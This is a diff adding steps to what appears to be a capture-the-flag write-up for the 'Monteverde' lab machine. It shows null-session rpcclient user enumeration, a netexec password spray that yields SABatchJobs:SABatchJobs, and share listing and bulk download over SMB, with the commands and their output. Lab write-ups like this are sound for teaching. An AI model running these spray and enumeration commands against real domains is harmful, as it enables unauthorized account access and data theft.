@@ -18,7 +18,7 @@ Difficulty -> Medium.
 
 <br />
 
-# Introduction:
+# Introduction
 
 <br />
 
@@ -26,7 +26,7 @@ Difficulty -> Medium.
 
 <br />
 
-# Enumeration:
+# Enumeration
 
 <br />
 
@@ -116,7 +116,7 @@ So we add them to our `/etc/hosts` file:
 
 <br />
 
-# SMB Enumeration:
+# SMB Enumeration: -> Port 445
 
 <br />
 
@@ -142,6 +142,161 @@ We attempt a null session (anonymous access) SMB connection to enumerate shares,
 SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
 SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\: 
 SMB         10.10.10.172    445    MONTEVERDE       [-] Error enumerating shares: STATUS_ACCESS_DENIED
+```
+
+<br />
+
+## Rpcclient
+
+<br />
+
+On the other hand, null session works for `rpcclient`:
+
+<br />
+
+```bash
+❯ rpcclient -U "" MEGABANK.LOCAL -N
+rpcclient $> 
+```
+
+<br />
+
+Inside, we can enumerate the domain users with the command `enumdomusers`:
+
+<br />
+
+```bash
+❯ rpcclient -U "" MEGABANK.LOCAL -N
+rpcclient $> enumdomusers
+user:[Guest] rid:[0x1f5]
+user:[AAD_987d7f2f57d2] rid:[0x450]
+user:[mhope] rid:[0x641]
+user:[SABatchJobs] rid:[0xa2a]
+user:[svc-ata] rid:[0xa2b]
+user:[svc-bexec] rid:[0xa2c]
+user:[svc-netapp] rid:[0xa2d]
+user:[dgalanos] rid:[0xa35]
+user:[roleary] rid:[0xa36]
+user:[smorgan] rid:[0xa37]
+```
+
+<br />
+
+Then, we put this `usernames` into a file:
+
+<br />
+
+```bash
+❯ rpcclient -U "" MEGABANK.LOCAL -N -c "enumdomusers" | grep -oP "\[.*?\]" | grep -v "0x" | tr -d "[]" | sponge users.txt
+❯ /usr/bin/cat users.txt
+Guest
+AAD_987d7f2f57d2
+mhope
+SABatchJobs
+svc-ata
+svc-bexec
+svc-netapp
+dgalanos
+roleary
+smorgan
+```
+
+<br />
+
+## SMB Spray Attack
+
+<br />
+
+At this point, we can attempt a Spray Attack with this usernames.
+
+It may seem silly, but it is quite typical for a company user to use their nickname as a password.
+
+To perform this attack, we will run `netexec` using the `--continue-on-success` flag. By this way, the program will continue running including after a valid match.
+
+<br />
+
+```bash
+❯ netexec smb MEGABANK.LOCAL -u users.txt -p users.txt --continue-on-success
+...[snip]...
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:mhope STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:mhope STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:mhope STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:mhope STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:mhope STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:mhope STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:SABatchJobs STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:SABatchJobs STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:SABatchJobs STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
+...[snip]...
+
+```
+
+<br />
+
+In this case, we only have one match:
+
+But we have valid credentials: `SABatchJobs:SABatchJobs`
+
+## SMB Authenticated Enumeration:
+
+<br />
+
+Enumerating the shares available for this user, we find the following:
+
+<br />
+
+```bash
+❯ netexec smb MEGABANK.LOCAL -u SABatchJobs -p SABatchJobs --shares
+SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
+SMB         10.10.10.172    445    MONTEVERDE       [*] Enumerated shares
+SMB         10.10.10.172    445    MONTEVERDE       Share           Permissions     Remark
+SMB         10.10.10.172    445    MONTEVERDE       -----           -----------     ------
+SMB         10.10.10.172    445    MONTEVERDE       ADMIN$                          Remote Admin
+SMB         10.10.10.172    445    MONTEVERDE       azure_uploads   READ            
+SMB         10.10.10.172    445    MONTEVERDE       C$                              Default share
+SMB         10.10.10.172    445    MONTEVERDE       E$                              Default share
+SMB         10.10.10.172    445    MONTEVERDE       IPC$            READ            Remote IPC
+SMB         10.10.10.172    445    MONTEVERDE       NETLOGON        READ            Logon server share 
+SMB         10.10.10.172    445    MONTEVERDE       SYSVOL          READ            Logon server share 
+SMB         10.10.10.172    445    MONTEVERDE       users$          READ            
+```
+
+<br />
+
+There are several relevant resources in the output, but the most interesting is the `users$` one.
+
+To access it, we can use `smbcclient`:
+
+<br />
+
+```bash
+❯ smbclient //MEGABANK.LOCAL/Users$ -U SABatchJobs
+Password for [WORKGROUP\SABatchJobs]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Fri Jan  3 14:12:48 2020
+  ..                                  D        0  Fri Jan  3 14:12:48 2020
+  dgalanos                            D        0  Fri Jan  3 14:12:30 2020
+  mhope                               D        0  Fri Jan  3 14:41:18 2020
+  roleary                             D        0  Fri Jan  3 14:10:30 2020
+  smorgan                             D        0  Fri Jan  3 14:10:24 2020
+
+		31999 blocks of size 4096. 28979 blocks available
+```
+
+<br />
+
+And download its content to our local machine for further analyze:
+
+<br >
+
+```bash
+smb: \> prompt off
+smb: \> recurse on
+smb: \> mget *
+getting file \mhope\azure.xml of size 1212 as mhope/azure.xml (6,6 KiloBytes/sec) (average 6,6 KiloBytes/sec)
 ```
 
 <br />
